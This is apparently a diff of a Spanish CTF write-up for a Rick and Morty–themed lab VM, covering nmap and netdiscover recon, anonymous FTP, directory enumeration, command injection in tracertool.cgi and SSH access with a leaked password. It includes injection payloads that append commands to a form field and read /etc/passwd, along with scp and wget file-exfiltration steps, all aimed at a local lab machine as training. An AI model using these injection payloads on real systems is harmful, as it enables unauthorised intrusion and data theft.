@@ -6,171 +6,143 @@
 
 ## Índice
 
-1. Preparación y arranque de la VM  
+1. Arranque de la VM y contexto inicial  
 2. Descubrimiento de IP (netdiscover + ifconfig)  
-3. Ajuste de red en VMware (red aislada 192.168.247.0/24)  
-4. Enumeración con Nmap (modo lab vs metodología real en fases)  
-5. FTP anónimo (descarga de flag)  
-6. Enumeración web (dirsearch) + `/passwords/` + `robots.txt`  
-7. Command Injection en `tracertool.cgi` (RCE como `apache`) + enumeración de usuarios  
-8. Panel 9090 (Cockpit) y flag  
-9. Puertos extra (13337 / 22222 / 60000) + SSH real en 22222  
-10. Acceso SSH como `Summer` + post-explotación inicial  
-11. Pivot local (homes de Morty/Rick) + extracción de archivos  
-12. Exfiltración a Kali (python http.server + wget)  
+3. Red aislada en VMware (por qué se hace)  
+4. Enumeración con Nmap (lab) + metodología real en fases  
+5. FTP anónimo (flag)  
+6. Web (80): dirsearch + `/passwords/` + `robots.txt`  
+7. `tracertool.cgi`: Command Injection + enumeración de usuarios  
+8. Cockpit/HTTP 9090 (qué es, por qué importa, por qué ir por navegador)  
+9. Puertos “raros”: 13337 / 60000 (cómo interpretar `unknown`)  
+10. SSH alternativo 22222 (por qué es clave)  
+11. Acceso SSH como `Summer` + post-explotación mínima  
+12. Exfiltración de archivos (scp / python http.server / wget)  
 13. Análisis de imagen (exiftool + strings) → password del ZIP  
 
 ---
 
 ## 1. Arranque de la VM y consola inicial
 
-Una vez instalada la máquina en VMware e iniciada, se ve la consola de Fedora Server y un login local.
+Una vez iniciada la máquina víctima en VMware, vemos el login local en consola.
 
-📷 **Imagen 1 — Consola inicial (login)**
+📷 **Imagen 1 — Consola inicial**
 ![Consola Fedora / login](images/01-vm-boot-login.png)
 
-En la propia consola se muestra algo clave:
-
-- **Admin Console**: `https://127.0.0.1:9090/`
-
-Esto suele ser **Cockpit**, un panel de administración web típico en Fedora/RHEL. En CTFs a menudo está expuesto en red (no solo localhost), así que lo tendremos en el radar.
+La propia consola muestra una pista importante: un panel de administración en `https://127.0.0.1:9090/`.  
+En Fedora/RHEL esto suele ser **Cockpit** (más adelante veremos por qué es relevante).
 
 ---
 
-## 2. No tenemos IP: descubrimiento con netdiscover
+## 2. Descubrimiento de IP (no tenemos info)
 
-Como no tenemos ninguna información inicial, el primer paso es descubrir hosts en la LAN.
+### 2.1 Netdiscover (reconocimiento ARP)
 
-### 2.1 `sudo netdiscover`
+En Kali:
 
 ```bash
 sudo netdiscover
 ```
 
-**¿Qué hace netdiscover?**  
-- Es una herramienta de reconocimiento ARP (ARP reconnaissance).
-- Funciona en redes locales (misma LAN / mismo segmento).
-- Envía peticiones ARP y recoge respuestas para listar: IP activa, MAC, vendor.
+**Qué hace y por qué se usa**
+- `netdiscover` realiza reconocimiento por **ARP**.
+- ARP solo funciona en **red local**, así que es perfecto cuando tienes Kali y la víctima en la misma red virtual.
+- Te permite ver IPs activas + MAC + fabricante (VMware, etc.)
 
-**¿Por qué `sudo`?**  
-Porque necesita privilegios para capturar/enviar ARP (raw sockets).
+**Por qué `sudo`**
+- Necesita privilegios para capturar/enviar ARP (raw sockets).
 
 📷 **Imagen 2 — netdiscover + ifconfig**
-![netdiscover e ifconfig](images/02-netdiscover-ifconfig.png)
+![netdiscover + ifconfig](images/02-netdiscover-ifconfig.png)
 
 ---
 
-## 3. Afinar el rango: `ifconfig` (IP y máscara)
-
-### 3.1 `ifconfig`
+## 3. Calcular rango con ifconfig
 
 ```bash
 ifconfig
 ```
 
-Salida relevante:
+Ejemplo:
 
 ```text
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.184.128  netmask 255.255.255.0  broadcast 192.168.184.255
 ```
 
-#### Explicación (campo a campo)
-
-- `eth0`: interfaz de red.
-- `flags`:
-  - `UP`: activa
-  - `BROADCAST`: permite broadcast
-  - `RUNNING`: operativa
-  - `MULTICAST`: multicast
-- `mtu 1500`: tamaño máximo de trama.
-- `inet`: IP asignada.
-- `netmask 255.255.255.0`: equivalente a `/24`.
-- `broadcast`: broadcast del segmento.
-
-**Rango resultante:** `192.168.184.0/24`
+**Qué significa**
+- `inet`: tu IP
+- `netmask 255.255.255.0` = `/24`
+- Por tanto, tu rango sería `192.168.184.0/24`
 
 ---
 
-## 4. `netdiscover --help` (explicación de flags)
+## 4. Red aislada VMware (por qué se hace)
 
-```bash
-netdiscover --help
-```
-
-Flags importantes:
-
-- `-i device`: interfaz (ej. `eth0`).
-- `-r range`: rango a escanear (`192.168.x.0/24`).
-- `-l file`: lista de rangos desde fichero.
-- `-p`: modo pasivo (no envía ARP).
-- `-f`: fast mode.
-- `-P` / `-L`: formatos de salida.
-
----
-
-## 5. Red aislada VMware: 192.168.247.0/24
-
-Se creó red virtual “parque de bolos”:
+Para que ambas máquinas se vean, se creó una red virtual nueva en VMware:
 
 - `192.168.247.0/24`
 
-y se asignó a Kali y a la VM víctima.
+Esto se hace en auditorías/labs porque:
+- facilita ARP (netdiscover)
+- evita mezclar con redes reales
+- simplifica el troubleshooting
 
-### 5.1 Netdiscover dirigido al rango
+En ese rango:
+- Kali: `192.168.247.129`
+- Víctima (probable): `192.168.247.128`
+
+Escaneo ARP dirigido:
 
 ```bash
 sudo netdiscover -r 192.168.247.0/24
 ```
 
-- `-r`: obliga a escanear ese rango.
-
-Luego confirmamos Kali:
-
-```bash
-ifconfig
-```
-
-Kali: `192.168.247.129`
-
-Interpretación:
-- `192.168.247.128` = probable víctima (si solo hay dos VMs en esa red).
+- `-r`: fuerza el rango a escanear (más rápido y preciso).
 
 ---
 
-## 6. Confirmación con Nmap (escaneo de laboratorio)
+## 5. Confirmación del objetivo con Nmap (modo laboratorio)
 
 ```bash
 nmap -p- -sCV -n -Pn -vvv --open -T5 -oN Rickdiculously 192.168.247.128
 ```
 
-### 6.1 Explicación MUY detallada de flags
+### 5.1 Flags (explicación extendida)
 
-- `-p-`: todos los puertos TCP (1–65535).  
-- `-sC`: scripts NSE por defecto (info extra/configs).  
-- `-sV`: detección de versiones.  
-- `-n`: sin DNS.  
-- `-Pn`: sin ping discovery (asume host up).  
-- `-vvv`: salida muy verbosa.  
-- `--open`: solo muestra puertos open.  
-- `-T5`: timing agresivo (rápido, más ruido).  
-- `-oN Rickdiculously`: guarda salida “normal” a fichero.
+- `-p-`: escanea **1–65535** (todos los puertos TCP).  
+  En CTFs es clave porque esconden servicios en puertos altos (ej. 13337/22222/60000).
 
-Puertos encontrados:
-- 21, 22, 80, 9090, 13337, 22222, 60000
+- `-sC`: scripts NSE “por defecto”.  
+  Ventaja: detecta cosas útiles automáticamente (ej. `ftp-anon`).  
+  Desventaja: más ruido (más peticiones).
+
+- `-sV`: identifica **versiones** y banners.
+
+- `-n`: sin DNS.
+
+- `-Pn`: asume host UP.
+
+- `-vvv`: salida muy verbosa.
+
+- `--open`: solo puertos open.
+
+- `-T5`: timing agresivo.
+
+- `-oN`: guarda la salida.
 
 ---
 
-## 7. Metodología real (Nmap en fases)
+## 6. Metodología realista: Nmap en fases (por qué es mejor)
 
-### Fase 1: descubrir puertos con menos ruido
+### Fase 1: descubrir puertos “sigiloso”
 
 ```bash
 nmap 192.168.247.128 -sS -T0
 ```
 
-- `-sS`: SYN scan (semi-sigiloso).
-- `-T0`: el más lento (menos agresivo).
+- `-sS`: SYN scan.
+- `-T0`: timing más lento.
 
 ### Fase 2: enumeración dirigida
 
@@ -180,14 +152,7 @@ nmap 192.168.247.128 -p21,22,80,9090,13337,22222,60000 -sCV
 
 ---
 
-## 8. FTP anónimo (21/tcp)
-
-Nmap indica:
-
-- `vsftpd 3.0.3`
-- `ftp-anon: Anonymous FTP login allowed`
-
-### 8.1 Conexión
+## 7. FTP anónimo (21/tcp)
 
 ```bash
 ftp -a 192.168.247.128
@@ -195,50 +160,24 @@ ftp -a 192.168.247.128
 
 - `-a`: login anónimo automático.
 
-### 8.2 Enumeración y descarga
+Dentro:
 
 ```text
 ftp> ls
 ftp> get FLAG.txt
 ```
 
-Verificación:
-
 ```bash
 cat FLAG.txt
 ```
 
-Flag:
-- `FLAG{Whoa this is unexpected} - 10 Points`
-
 ---
 
-## 9. Web (80/tcp): dirsearch
+## 8. Web en 80/tcp: enumeración con dirsearch
 
 ```bash
 dirsearch -u http://192.168.247.128
 ```
-
-- `-u`: URL objetivo.
-- usa wordlist (dirsearch usa su diccionario por defecto) y múltiples threads.
-
-admin
-login
-backup
-uploads
-images
-passwords
-cgi-bin
-dev
-test
-
-Entonces la herramienta prueba cosas como:
-
-http://target/admin
-http://target/login
-http://target/backup
-
-y reporta cuáles existen.
 
 Hallazgos:
 - `/passwords/` (200)
@@ -247,13 +186,12 @@ Hallazgos:
 
 ---
 
-## 10. `/passwords/` (Directory Listing)
+## 9. `/passwords/` (directory listing) + password
 
 📷 **Imagen 3 — Index of /passwords**
 ![Index /passwords](images/03-web-passwords-index.png)
 
-- `FLAG.txt` → `FLAG{Yeah d- just don't do it.} - 10 Points`
-- `passwords.html` → comentario:
+En `passwords.html`:
 
 ```html
 <!--Password: winter-->
@@ -261,71 +199,132 @@ Hallazgos:
 
 ---
 
-## 11. `robots.txt`
+## 10. `robots.txt` como “mapa”
 
-Contiene:
-
-- `/cgi-bin/root_shell.cgi`
+Incluye:
 - `/cgi-bin/tracertool.cgi`
 
 ---
 
-## 12. `tracertool.cgi` → Command Injection
+## 11. `tracertool.cgi` → Command Injection
 
-📷 **Imagen 4 — tracertool**
-![tracertool form](images/04-tracertool-form.png)
+📷 **Imagen 4 — tracertool.cgi**
+![Formulario tracertool](images/04-tracertool-form.png)
 
-Input:
+Input de prueba:
 
-- `192.168.247.128; whoami; pwd`
+```
+192.168.247.128; whoami; pwd
+```
 
-Confirma:
-- `apache`
-- `/var/www/cgi-bin`
+### 11.1 Output raro al leer /etc/passwd (Imagen 5)
 
-Operadores:
-- `;` secuencia
-- `&&` condicional éxito
-- `||` condicional fallo
-- `|` pipe (NO concatenación)
+📷 **Imagen 5 — Salida alterada**
+![Salida alterada](images/05-tracertool-output-art.png)
 
-### 12.1 Salida rara al leer /etc/passwd (Imagen 5)
+Bypass con salida corta:
 
-Con `; cat /etc/passwd` el CGI devuelve output “alterado”.
-
-📷 **Imagen 5 — Output alterado**
-![output alterado](images/05-tracertool-output-art.png)
-
-Bypass:
-
-- `; tail -n 30 /etc/passwd`
-
-Usuarios con `/bin/bash`:
-- RickSanchez
-- Morty
-- Summer
+```
+; tail -n 30 /etc/passwd
+```
 
 ---
 
-## 13. Cockpit (9090)
+## 12. Cockpit en 9090: por qué pasamos a ese puerto y por qué en navegador
+
+Del Nmap apareció:
+
+```text
+9090/tcp  open  http    Cockpit web service 161 or earlier
+|_http-title: Did not follow redirect to https://192.168.247.128:9090/
+| http-methods: 
+|_  Supported Methods: GET HEAD
+```
+
+### 12.1 Qué significa “open http Cockpit web service”
+
+- **Puerto 9090 abierto**: el servicio está accesible desde tu Kali.
+- **Servicio HTTP**: responde como servicio web.
+- **Cockpit**: Nmap identifica que es Cockpit (panel admin típico en Fedora/RHEL).
+
+**Por qué es importante**
+- Un panel admin expuesto es un objetivo prioritario:
+  - puede filtrar información
+  - puede permitir login con usuarios del sistema
+  - puede tener fallos o configuraciones débiles
+- En CTF muchas veces contiene flags o pistas (como aquí).
+
+### 12.2 “Did not follow redirect to https://…” (lo crítico)
+
+Cockpit suele forzar **HTTPS**.
+
+Nmap intentó leer título por HTTP y recibió un **redirect** a HTTPS.  
+Por eso te dice la URL correcta:
+
+- `https://192.168.247.128:9090/`
+
+**Conclusión práctica**: lo abres en navegador con `https://` (no `http://`).
+
+### 12.3 `Supported Methods: GET HEAD`
+
+El script `http-methods` detecta métodos permitidos:
+- `GET`: petición normal
+- `HEAD`: como GET, pero sin cuerpo
+
+En una auditoría real esto se usa para ver si hay métodos peligrosos (`PUT/DELETE/TRACE`).  
+Aquí no los hay, pero confirma que el servicio es web “normal”.
+
+### 12.4 Por qué en navegador
+
+Porque es un panel web real (Cockpit):
+- la interacción es visual
+- puedes ver login/pistas
+- puedes identificar contenido rápidamente
 
 📷 **Imagen 6 — Cockpit**
 ![Cockpit 9090 flag](images/06-cockpit-9090-flag.png)
 
-Flag:
-- `FLAG {THERE IS NO ZEUS, IN YOUR FACE!} - 10 POINTS`
+---
+
+## 13. Puertos extra: qué significan 22222 / 13337 / 60000
+
+### 13.1 22222/tcp open ssh OpenSSH 7.5 (protocol 2.0)
+
+- Hay un SSH real en **puerto no estándar**.
+- En CTF es típico que el 22 sea bait y el SSH real esté en otro puerto.
+
+Por eso probamos:
+
+```bash
+ssh Summer@192.168.247.128 -p 22222
+```
+
+### 13.2 13337/tcp open unknown
+
+- `unknown` significa: Nmap no reconoce el servicio (no que esté cerrado).
+- En CTF, 13337 suele ser backdoor o “flag server”.
+
+Se enumera con:
+
+```bash
+nmap 192.168.247.128 -p13337 -sCV
+```
+
+o incluso con `nc`.
+
+### 13.3 60000/tcp open unknown
+
+- Igual: servicio no reconocido.
+- Pero devuelve banner: “half baked reverse shell…”
+- Normalmente se probaría con `nc` para ver interacción.
 
 ---
 
-## 14. Puertos extra
+## 14. Enumeración dirigida (menos ruido)
 
 ```bash
 nmap 192.168.247.128 -p13337,22222,60000 -sCV
 ```
-
-- 13337 → flag directa
-- 22222 → SSH real
-- 60000 → banner reverse shell
 
 ---
 
@@ -337,9 +336,6 @@ ssh Summer@192.168.247.128 -p 22222
 
 Password: `winter`
 
-Dentro:
-- flag en `FLAG.txt`: `FLAG{Get off the high road Summer!} - 10 Points`
-
 ---
 
 ## 16. `sudo -l`
@@ -348,32 +344,22 @@ Dentro:
 sudo -l
 ```
 
-Sirve para listar comandos permitidos con sudo. Summer no tiene permisos.
-
 ---
 
-## 17. Exfiltración de archivos (Morty)
-
-Archivos:
-- `journal.txt.zip`
-- `Safe_Password.jpg`
-
-### 17.1 SCP (nota: `-P` mayúscula)
+## 17. Exfiltración (scp / http.server / wget)
 
 ```bash
 scp -P 22222 Summer@192.168.247.128:/home/Morty/journal.txt.zip ./
 scp -P 22222 Summer@192.168.247.128:/home/Morty/Safe_Password.jpg ./
 ```
 
-### 17.2 Servidor HTTP con Python
-
-Intento puerto 80 falla (puerto privilegiado). Correcto:
+Servidor:
 
 ```bash
 python3 -m http.server 8080
 ```
 
-Descarga en Kali:
+Descarga:
 
 ```bash
 wget http://192.168.247.128:8080/Safe_Password.jpg
@@ -387,22 +373,4 @@ wget http://192.168.247.128:8080/Safe_Password.jpg
 exiftool Safe_Password.jpg
 strings Safe_Password.jpg
 ```
-
-Hallazgo:
-
-- Password ZIP: `Meeseek`
-
----
-
-## Resumen
-
-Flags:
-- FTP, web, cockpit, 13337, SSH Summer
-
-Credenciales:
-- `winter`
-- `Meeseek` (ZIP)
-
-Siguiente paso:
-- descomprimir `journal.txt.zip` con `Meeseek`.
 
